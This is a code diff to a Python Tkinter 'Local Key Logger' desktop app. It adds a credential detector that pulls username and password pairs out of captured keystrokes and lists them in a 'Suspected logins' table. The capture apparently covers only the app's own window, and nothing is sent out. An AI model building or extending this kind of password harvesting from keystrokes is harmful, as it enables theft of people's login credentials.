@@ -2,6 +2,8 @@ import tkinter as tk
 
 from tkinter import ttk
 
+from credential_detection import CredentialDetector
+
 
 class KeyloggerGUI:
     """Desktop interface for local keyboard monitoring."""
@@ -13,6 +15,8 @@ class KeyloggerGUI:
         self.key_binding_id = None
         self.keystroke_count = 0
         self.captured_text = ""
+        self.credential_detector = CredentialDetector()
+        self.detected_logins = set()
 
         self.root.title("Local Key Logger")
         self.root.geometry("1000x650")
@@ -347,6 +351,7 @@ class KeyloggerGUI:
 
         key = self.format_key_event(event)
         self.update_captured_text(event)
+        self.update_suspected_logins()
 
         self.keystroke_tree.insert(
             "",
@@ -381,6 +386,33 @@ class KeyloggerGUI:
         if event.char:
             self.captured_text += event.char
 
+    def update_suspected_logins(self):
+        """Add newly detected login candidates to the login table."""
+        candidates = self.credential_detector.find_logins(
+            self.captured_text
+        )
+
+        for candidate in candidates:
+            login = (
+                candidate.username,
+                candidate.password
+            )
+
+            if login in self.detected_logins:
+                continue
+
+            self.detected_logins.add(login)
+
+            self.login_tree.insert(
+                "",
+                tk.END,
+                values=login
+            )
+
+        self.login_count_label.config(
+            text=f"Suspected logins: {len(self.detected_logins)}"
+        )
+
     @staticmethod
     def format_key_event(event):
         """Convert a Tkinter keyboard event into a readable value."""
@@ -410,6 +442,7 @@ class KeyloggerGUI:
 
         self.keystroke_count = 0
         self.captured_text = ""
+        self.detected_logins.clear()
 
         self.key_count_label.config(
             text="Keystrokes: 0"
